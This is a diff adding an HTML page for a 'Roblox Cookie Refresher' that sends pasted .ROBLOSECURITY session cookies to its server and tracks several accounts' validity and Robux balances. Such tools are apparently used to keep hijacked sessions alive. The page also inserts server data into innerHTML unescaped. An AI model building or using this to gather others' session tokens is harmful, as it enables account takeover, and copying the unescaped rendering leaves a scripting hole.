@@ -1,0 +1,518 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie Refresher Tool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(45deg, #00A2FF, #0078D4);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+
+        .add-cookie-section {
+            padding: 30px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #0078D4;
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #00A2FF, #0078D4);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-small {
+            padding: 8px 16px;
+            font-size: 14px;
+        }
+
+        .btn-danger {
+            background: linear-gradient(45deg, #ff4757, #ff3742);
+        }
+
+        .btn-success {
+            background: linear-gradient(45deg, #2ed573, #1e90ff);
+        }
+
+        .cookies-section {
+            padding: 30px;
+        }
+
+        .cookies-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .cookie-card {
+            border: 2px solid #eee;
+            border-radius: 12px;
+            padding: 20px;
+            background: #fafafa;
+            transition: border-color 0.3s, transform 0.2s;
+        }
+
+        .cookie-card:hover {
+            border-color: #0078D4;
+            transform: translateY(-2px);
+        }
+
+        .cookie-card.valid {
+            border-color: #2ed573;
+            background: #f0fff4;
+        }
+
+        .cookie-card.invalid {
+            border-color: #ff4757;
+            background: #fff5f5;
+        }
+
+        .cookie-header {
+            display: flex;
+            justify-content: between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .cookie-username {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .cookie-status {
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .status-valid {
+            background: #2ed573;
+            color: white;
+        }
+
+        .status-invalid {
+            background: #ff4757;
+            color: white;
+        }
+
+        .cookie-info {
+            margin-bottom: 15px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            padding: 5px 0;
+        }
+
+        .info-label {
+            font-weight: 600;
+            color: #666;
+        }
+
+        .info-value {
+            color: #333;
+        }
+
+        .cookie-actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 8px;
+        }
+
+        .status-online {
+            background: #2ed573;
+            box-shadow: 0 0 10px rgba(46, 213, 115, 0.5);
+        }
+
+        .status-offline {
+            background: #ff4757;
+            box-shadow: 0 0 10px rgba(255, 71, 87, 0.5);
+        }
+
+        .last-checked {
+            font-size: 12px;
+            color: #999;
+            margin-top: 10px;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+        }
+
+        .alert {
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .alert-success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+        }
+
+        .alert-error {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+        }
+
+        @media (max-width: 768px) {
+            .cookies-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .header h1 {
+                font-size: 2rem;
+            }
+            
+            .container {
+                margin: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🍪 Roblox Cookie Refresher</h1>
+            <p>Automatically monitor and refresh your Roblox account information in real-time</p>
+        </div>
+
+        <div class="add-cookie-section">
+            <h2>Add New Cookie</h2>
+            <div class="form-group">
+                <label for="cookieInput">Roblox .ROBLOSECURITY Cookie:</label>
+                <input type="password" id="cookieInput" placeholder="Enter your .ROBLOSECURITY cookie value here...">
+            </div>
+            <button class="btn" onclick="addCookie()">Add Cookie</button>
+        </div>
+
+        <div class="cookies-section">
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <h2>Active Cookies (<span id="cookieCount">0</span>)</h2>
+                <button class="btn btn-success btn-small" onclick="refreshAllCookies()">Refresh All</button>
+            </div>
+            
+            <div id="cookiesContainer" class="cookies-grid">
+                <div class="loading">No cookies added yet. Add a cookie above to get started!</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let ws;
+        let cookies = [];
+
+        // Initialize WebSocket connection
+        function initWebSocket() {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            ws = new WebSocket(`${protocol}//${window.location.host}`);
+            
+            ws.onopen = function() {
+                console.log('WebSocket connected');
+            };
+            
+            ws.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                handleWebSocketMessage(data);
+            };
+            
+            ws.onclose = function() {
+                console.log('WebSocket disconnected, attempting to reconnect...');
+                setTimeout(initWebSocket, 3000);
+            };
+            
+            ws.onerror = function(error) {
+                console.error('WebSocket error:', error);
+            };
+        }
+
+        function handleWebSocketMessage(data) {
+            switch(data.type) {
+                case 'cookieList':
+                    cookies = data.cookies;
+                    renderCookies();
+                    break;
+                case 'cookieAdded':
+                    cookies.push(data.cookie);
+                    renderCookies();
+                    break;
+                case 'cookieUpdate':
+                    const index = cookies.findIndex(c => c.id === data.cookie.id);
+                    if (index !== -1) {
+                        cookies[index] = data.cookie;
+                        renderCookies();
+                    }
+                    break;
+                case 'cookieRemoved':
+                    cookies = cookies.filter(c => c.id !== data.cookieId);
+                    renderCookies();
+                    break;
+            }
+        }
+
+        async function addCookie() {
+            const cookieInput = document.getElementById('cookieInput');
+            const cookie = cookieInput.value.trim();
+            
+            if (!cookie) {
+                alert('Please enter a cookie value');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/add-cookie', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ cookie })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    cookieInput.value = '';
+                    showAlert('Cookie added successfully!', 'success');
+                } else {
+                    showAlert('Failed to add cookie: ' + result.error, 'error');
+                }
+            } catch (error) {
+                showAlert('Error adding cookie: ' + error.message, 'error');
+            }
+        }
+
+        async function refreshCookie(cookieId) {
+            try {
+                const response = await fetch(`/api/refresh-cookie/${cookieId}`, {
+                    method: 'POST'
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    showAlert('Cookie refreshed successfully!', 'success');
+                } else {
+                    showAlert('Failed to refresh cookie', 'error');
+                }
+            } catch (error) {
+                showAlert('Error refreshing cookie: ' + error.message, 'error');
+            }
+        }
+
+        async function removeCookie(cookieId) {
+            if (!confirm('Are you sure you want to remove this cookie?')) {
+                return;
+            }
+            
+            try {
+                const response = await fetch(`/api/remove-cookie/${cookieId}`, {
+                    method: 'DELETE'
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    showAlert('Cookie removed successfully!', 'success');
+                } else {
+                    showAlert('Failed to remove cookie', 'error');
+                }
+            } catch (error) {
+                showAlert('Error removing cookie: ' + error.message, 'error');
+            }
+        }
+
+        async function refreshAllCookies() {
+            for (const cookie of cookies) {
+                await refreshCookie(cookie.id);
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+        }
+
+        function renderCookies() {
+            const container = document.getElementById('cookiesContainer');
+            const countElement = document.getElementById('cookieCount');
+            
+            countElement.textContent = cookies.length;
+            
+            if (cookies.length === 0) {
+                container.innerHTML = '<div class="loading">No cookies added yet. Add a cookie above to get started!</div>';
+                return;
+            }
+            
+            container.innerHTML = cookies.map(cookie => `
+                <div class="cookie-card ${cookie.isValid ? 'valid' : 'invalid'}">
+                    <div class="cookie-header">
+                        <div>
+                            <span class="status-indicator ${cookie.isValid ? 'status-online' : 'status-offline'}"></span>
+                            <span class="cookie-username">${cookie.username || 'Unknown'}</span>
+                        </div>
+                        <span class="cookie-status ${cookie.isValid ? 'status-valid' : 'status-invalid'}">
+                            ${cookie.isValid ? 'Valid' : 'Invalid'}
+                        </span>
+                    </div>
+                    
+                    <div class="cookie-info">
+                        ${cookie.isValid ? `
+                            <div class="info-row">
+                                <span class="info-label">User ID:</span>
+                                <span class="info-value">${cookie.id}</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-label">Display Name:</span>
+                                <span class="info-value">${cookie.displayName || 'N/A'}</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-label">Robux:</span>
+                                <span class="info-value">💰 ${cookie.robux || 0}</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-label">Account Created:</span>
+                                <span class="info-value">${cookie.created ? new Date(cookie.created).toLocaleDateString() : 'N/A'}</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-label">Description:</span>
+                                <span class="info-value">${cookie.description || 'No description'}</span>
+                            </div>
+                        ` : `
+                            <div class="info-row">
+                                <span class="info-label">Error:</span>
+                                <span class="info-value">${cookie.error || 'Invalid cookie'}</span>
+                            </div>
+                        `}
+                    </div>
+                    
+                    <div class="cookie-actions">
+                        <button class="btn btn-success btn-small" onclick="refreshCookie('${cookie.id}')">
+                            🔄 Refresh
+                        </button>
+                        <button class="btn btn-danger btn-small" onclick="removeCookie('${cookie.id}')">
+                            🗑️ Remove
+                        </button>
+                    </div>
+                    
+                    <div class="last-checked">
+                        Last checked: ${new Date(cookie.lastChecked).toLocaleString()}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function showAlert(message, type) {
+            const alertDiv = document.createElement('div');
+            alertDiv.className = `alert alert-${type}`;
+            alertDiv.textContent = message;
+            
+            const container = document.querySelector('.add-cookie-section');
+            container.insertBefore(alertDiv, container.firstChild);
+            
+            setTimeout(() => {
+                alertDiv.remove();
+            }, 5000);
+        }
+
+        // Initialize when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            initWebSocket();
+        });
+
+        // Allow Enter key to submit cookie
+        document.getElementById('cookieInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                addCookie();
+            }
+        });
+    </script>
+</body>
+</html>
